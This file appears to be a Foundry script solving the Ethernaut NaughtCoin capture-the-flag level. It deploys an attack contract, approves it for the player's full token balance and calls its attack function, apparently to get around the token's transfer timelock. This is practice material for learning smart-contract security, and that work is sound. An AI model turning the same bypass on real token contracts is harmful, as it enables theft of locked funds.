// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {NaughtCoinAttack} from "../src/attacks/NaughtCoinAttack.sol";
import {NaughtCoin} from "../src/levels/NaughtCoin.sol";

contract NaughtCoinScript is Script {
    NaughtCoin public instance = NaughtCoin(payable(0xBC646401599C0926763D5b4ed1503b4AF860a2c9));
    NaughtCoinAttack public attacker;

    function run() external {
	vm.startBroadcast();
	attacker = new NaughtCoinAttack();
	console.log("NaughtCoinAttack Contract deployed to:", address(attacker));
	uint256 balance = instance.balanceOf(msg.sender);
	console.log("Player current balance:", balance);
	bool result = instance.approve(address(attacker), balance);
	console.log("Approved NaughtCoinAttack to use Player balance?", result);
	console.log("Attacking...");
	attacker.attack(address(instance));
	console.log("Player new balance:", instance.balanceOf(msg.sender));
	vm.stopBroadcast();
    }
}
